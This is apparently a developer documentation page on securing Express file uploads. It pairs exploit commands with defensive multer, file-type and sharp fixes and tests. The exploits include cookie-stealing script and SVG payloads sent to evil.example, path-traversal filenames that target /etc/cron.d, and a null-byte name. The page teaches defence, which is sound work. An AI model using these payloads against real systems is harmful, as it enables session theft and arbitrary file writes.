---
title: File upload security
description: The attack surface of file uploads — size exhaustion, content-type spoofing, path traversal, stored XSS, zip bombs and SSRF — with the multer, file-type and sharp fixes.
status: current
updated: 2026-09-08
---

An upload endpoint accepts attacker-controlled bytes, an attacker-controlled filename, and an attacker-controlled content type, then usually stores all three and serves them back. Every one of those is a separate attack surface. This page covers the exploits; the multer configuration reference is [File uploads](../express-libraries/file-uploads.md). The runnable version is [`examples/file-upload`](../../examples/file-upload/README.md).

## Unrestricted size — disk and memory exhaustion

### The threat

Without a size limit, one request can fill the disk or exhaust memory, taking the whole service down. A single client streaming a multi-gigabyte body is enough; no botnet required.

### The exploit

```bash
# Stream 5 GB of zeros as an "avatar". With no limit, the server buffers or
# writes all of it.
head -c 5G /dev/zero | \
  curl -s -X POST http://localhost:3000/avatar \
  -F 'avatar=@-;type=image/png;filename=avatar.png'
```

### The fix

Set `limits` on multer so the parser aborts once the cap is exceeded, and map the resulting error to a `413`.

```js good title="src/upload.js"
import multer from 'multer'

export const upload = multer({
  storage: multer.memoryStorage(),
  limits: {
    fileSize: 2 * 1024 * 1024, // 2 MB per file
    files: 1,                  // one file per request
    fields: 10,                // cap non-file fields too
  },
})
```

Multer raises a `MulterError` with `code === 'LIMIT_FILE_SIZE'` when the cap is hit. Handle it explicitly — the default would surface as a generic 500:

```js good title="src/upload.error.js"
import multer from 'multer'

export function handleUploadErrors(err, req, res, next) {
  if (err instanceof multer.MulterError) {
    if (err.code === 'LIMIT_FILE_SIZE') {
      return res.status(413).json({ error: 'file too large' })
    }
    return res.status(400).json({ error: err.code })
  }
  next(err)
}
```

## Content-type spoofing

### The threat

The `Content-Type` header and the file extension are both attacker-controlled and mean nothing. A file named `avatar.png` with `Content-Type: image/png` can contain PHP, HTML or a script. If the server trusts the claimed type — to decide where to store it, whether to serve it inline, or whether to hand it to an interpreter — the attacker controls that decision.

### The exploit

```bash
# An HTML/script payload wearing a PNG name and a PNG content type.
printf '<script>document.location="https://evil.example/?c="+document.cookie</script>' > payload.html
curl -s -X POST http://localhost:3000/avatar \
  -F 'avatar=@payload.html;type=image/png;filename=avatar.png'
```

### The fix

Verify the **magic bytes** — the actual leading bytes of the content — and match them against an allow-list of types you accept. `file-type` (22.0.2, ESM-only) sniffs the buffer and returns the detected `ext`/`mime`, or `undefined` when it matches nothing:

```js good title="src/verify-type.js"
import { fileTypeFromBuffer } from 'file-type'

const ALLOWED = new Map([
  ['image/png', 'png'],
  ['image/jpeg', 'jpg'],
  ['image/webp', 'webp'],
])

export async function assertAllowedImage(buffer) {
  const detected = await fileTypeFromBuffer(buffer)
  // Reject when nothing matched OR the real type is not allow-listed.
  if (!detected || !ALLOWED.has(detected.mime)) {
    const err = new Error('unsupported file type')
    err.statusCode = 415
    throw err
  }
  return detected // { ext, mime } derived from bytes, not the request
}
```

Decide everything from `detected.mime`, never from `req.file.mimetype` or the extension. The spoofed `avatar.png` above sniffs as HTML, matches nothing in `ALLOWED`, and is rejected with `415`.

## Filename path traversal

### The threat

`req.file.originalname` is attacker-controlled. If you join it onto a directory to build the storage path, `../` sequences climb out of the intended folder and let the attacker write anywhere the process can — overwriting config, dropping a cron job, or planting a web-served script.

### The exploit

```bash
# originalname escapes the uploads dir on POSIX…
curl -s -X POST http://localhost:3000/avatar \
  -F 'avatar=@shell.sh;filename=../../etc/cron.d/x'

# …and on Windows, and with a null byte to truncate a checked extension.
curl -s -X POST http://localhost:3000/avatar \
  -F 'avatar=@shell.sh;filename=..\\..\\Windows\\Temp\\x'
curl -s -X POST http://localhost:3000/avatar \
  -F 'avatar=@shell.php;filename=avatar.png%00.php'
```

### The fix

Never derive the stored name from `originalname`. Generate a random name and choose the extension from the sniffed type. A random name cannot contain `../`, `..\`, or a null byte.

```js good title="src/store.js"
import { randomUUID } from 'node:crypto'
import { join } from 'node:path'

// Upload dir is OUTSIDE the web root and is not executable.
const UPLOAD_DIR = '/var/app-data/uploads'

export function safePath(ext) {
  // randomUUID() yields only [0-9a-f-]; ext comes from the type allow-list.
  const name = `${randomUUID()}.${ext}`
  return join(UPLOAD_DIR, name)
}
```

If you must keep the original name for display, store it as metadata in the database and never use it as a filesystem path.

## Stored XSS via uploaded HTML/SVG

### The threat

An uploaded `.html` or `.svg` served **inline** from your origin runs its embedded script in your origin's context. SVG is the common surprise: it is an image *and* a document that can carry `<script>`. If avatars are served from the app's own domain, an uploaded SVG becomes stored XSS against every viewer.

### The exploit

```bash
printf '<svg xmlns="http://www.w3.org/2000/svg"><script>fetch("https://evil.example/?c="+document.cookie)</script></svg>' > x.svg
curl -s -X POST http://localhost:3000/avatar -F 'avatar=@x.svg;type=image/svg+xml'
# Later, when another user's browser loads /uploads/<id>.svg inline, the script runs.
```

### The fix

Layer four defenses; do not rely on any one alone.

- **Serve downloads as attachments, with nosniff.** `Content-Disposition: attachment` makes the browser save rather than render, and `X-Content-Type-Options: nosniff` stops it from re-interpreting the bytes as HTML.
- **Serve user content from a separate, cookie-less origin** (e.g. `usercontent.example.net`), so even if something renders, it has no access to your session cookies or your DOM.
- **Re-encode raster images with `sharp`.** Decoding and re-encoding a PNG/JPEG/WebP strips any appended script or polyglot payload and normalizes the format. Reject SVG outright unless you truly need it, in which case sanitize it as untrusted markup.

```js good title="src/serve-and-reencode.js"
import sharp from 'sharp'

// Re-encode to a fixed format; output contains only pixel data.
export async function reencode(buffer) {
  return sharp(buffer)
    .rotate()                    // apply EXIF orientation, then drop metadata
    .png({ quality: 90 })
    .toBuffer()
}

// When serving stored files back:
export function downloadHeaders(res, filename) {
  res.setHeader('Content-Disposition', `attachment; filename="${filename}"`)
  res.setHeader('X-Content-Type-Options', 'nosniff')
  res.setHeader('Content-Security-Policy', "default-src 'none'; sandbox")
}
```

## Zip bombs and decompression limits

A small compressed upload can expand to gigabytes when you unpack it — a decompression bomb. If you accept archives or compressed bodies, never decompress the whole thing into memory or disk unbounded. Stream the decompression and abort once an output-byte budget is exceeded, and reject archives whose declared entry sizes or entry counts exceed a limit before you extract them. The compressed size is not a safe proxy for the extracted size.

## SSRF via "upload from URL"

### The threat

A feature that fetches a file from a user-supplied URL is a server-side request forgery primitive. The attacker points it at `http://169.254.169.254/…` (cloud metadata), `http://localhost:…` (internal admin endpoints) or an internal hostname, and your server makes the request from inside the network, returning or storing the response.

### The fix

Treat the URL as hostile: allow only `https`, resolve the hostname and reject any address in private, loopback, link-local or unique-local ranges, disable redirect-following (or re-validate the target after each redirect), and set a timeout with `AbortSignal.timeout()`.

```js good title="src/fetch-from-url.js"
import dns from 'node:dns/promises'
import net from 'node:net'

function isPrivate(ip) {
  if (net.isIPv4(ip)) {
    const [a, b] = ip.split('.').map(Number)
    return a === 10 || a === 127 || (a === 169 && b === 254) ||
      (a === 172 && b >= 16 && b <= 31) || (a === 192 && b === 168)
  }
  return ip === '::1' || ip.startsWith('fc') || ip.startsWith('fd') ||
    ip.startsWith('fe80')
}

export async function fetchUserUrl(raw) {
  const url = new URL(raw)
  if (url.protocol !== 'https:') throw new Error('only https allowed')

  const { address } = await dns.lookup(url.hostname)
  if (isPrivate(address)) throw new Error('blocked target')

  return fetch(url, { redirect: 'error', signal: AbortSignal.timeout(5000) })
}
```

:::warning
DNS rebinding can change what a hostname resolves to between your check and the actual fetch. For high-risk deployments, pin the connection to the address you validated, or route all outbound upload fetches through an egress proxy that enforces the allow-list.
:::

## Presigned direct-to-S3 uploads

For large files, the better pattern is to keep the bytes off your app server entirely. Issue a short-lived presigned URL and let the client upload directly to object storage. The app server never buffers the file, so size exhaustion against *it* disappears.

```js good title="src/presign.js"
import { S3Client, PutObjectCommand } from '@aws-sdk/client-s3'
import { getSignedUrl } from '@aws-sdk/s3-request-presigner'
import { randomUUID } from 'node:crypto'

const s3 = new S3Client({})

export function presignAvatar() {
  const key = `avatars/${randomUUID()}`
  const command = new PutObjectCommand({
    Bucket: process.env.UPLOAD_BUCKET,
    Key: key,
    ContentType: 'image/png',
  })
  return getSignedUrl(s3, command, { expiresIn: 60 })
}
```

:::warning
Presigning moves the bytes, not the trust. The client can still upload anything within the constraints you signed. You must validate server-side **after the fact** — download the object (or have S3 notify you), sniff its magic bytes, re-encode it, and only then mark it usable. A presigned upload that is served before validation is the same content-type/XSS hole with an extra hop.
:::

## Defense in depth and storage rules

- **Store outside the web root.** If uploads live under a directory the web server maps to a URL, a planted `.php`/`.jsp`/`.html` may be executed or served inline. Keep them in a data directory and stream them through an authenticated handler.
- **Never mark the upload directory executable**, and configure the storage/CDN not to run anything from it.
- **Scan with ClamAV** (or an equivalent) as a defense-in-depth layer for malware in documents that pass type checks. It is a supplement to — not a replacement for — type verification and re-encoding.

## How to verify the fixes

Re-run each exploit and confirm the new response:

```bash
# Oversized upload -> 413
head -c 5G /dev/zero | curl -s -o /dev/null -w '%{http_code}\n' \
  -X POST http://localhost:3000/avatar -F 'avatar=@-;filename=big.png'
# => 413

# Spoofed HTML-as-PNG -> 415 (magic bytes are HTML, not PNG)
curl -s -o /dev/null -w '%{http_code}\n' -X POST http://localhost:3000/avatar \
  -F 'avatar=@payload.html;type=image/png;filename=avatar.png'
# => 415
```

```js title="test/upload.test.js"
import test from 'node:test'
import assert from 'node:assert/strict'
import request from 'supertest'
import { createApp } from '../src/app.js'

test('rejects a spoofed PNG that is really HTML', async () => {
  const res = await request(createApp())
    .post('/avatar')
    .attach('avatar', Buffer.from('<script>alert(1)</script>'), {
      filename: 'avatar.png',
      contentType: 'image/png',
    })
  assert.equal(res.status, 415)
})

test('rejects a file over the size limit', async () => {
  const big = Buffer.alloc(3 * 1024 * 1024, 0x2e)
  const res = await request(createApp())
    .post('/avatar')
    .attach('avatar', big, { filename: 'a.png', contentType: 'image/png' })
  assert.equal(res.status, 413)
})
```

## Common mistakes

- **Trusting `req.file.mimetype` or the extension.** Both are attacker-set. Sniff the magic bytes and decide from those.
- **Using `originalname` as a path.** `../../etc/cron.d/x`, `..\..\` and `%00` all escape the directory. Generate a random name; keep the original as metadata only.
- **Serving uploads inline from the app origin.** An SVG or HTML upload becomes stored XSS. Use `Content-Disposition: attachment`, `nosniff`, and a cookie-less origin.
- **No size or count limits.** One request exhausts disk or memory. Set multer `limits` and map `LIMIT_FILE_SIZE` to 413.
- **Decompressing archives unbounded.** A zip bomb expands to gigabytes. Budget output bytes and reject oversized entries before extracting.
- **"Upload from URL" without SSRF checks.** It reaches cloud metadata and internal services. Allow-list schemes, block private IPs, disable redirects, set a timeout.
- **Treating a presigned upload as validated.** The client still controls the bytes. Sniff and re-encode server-side after the upload.

## Production considerations

- Put upload storage on a separate origin and, ideally, a separate bucket/volume with its own quota, so a storage-exhaustion attempt cannot starve the primary service.
- Enforce per-user and global upload rate limits; a size cap per file does not stop many files. See [Rate limiting and abuse](rate-limiting-and-abuse.md).
- Run image re-encoding and virus scanning in a background worker, not in the request path, so a slow decode cannot tie up request handlers. Mark the object unusable until the worker clears it.
- Log the sniffed type, byte size and generated key (never the raw `originalname` unescaped) so an abusive pattern is visible without echoing attacker-controlled strings into logs.

## Related topics

- [File uploads](../express-libraries/file-uploads.md) — configuring multer, storage engines and streaming.
- [Cross-site scripting (XSS)](xss.md) — why an inline-served SVG or HTML upload runs as script.
- [Rate limiting and abuse](rate-limiting-and-abuse.md) — capping upload volume, not just per-file size.
- [Security headers](security-headers.md) — `X-Content-Type-Options` and CSP for served files.
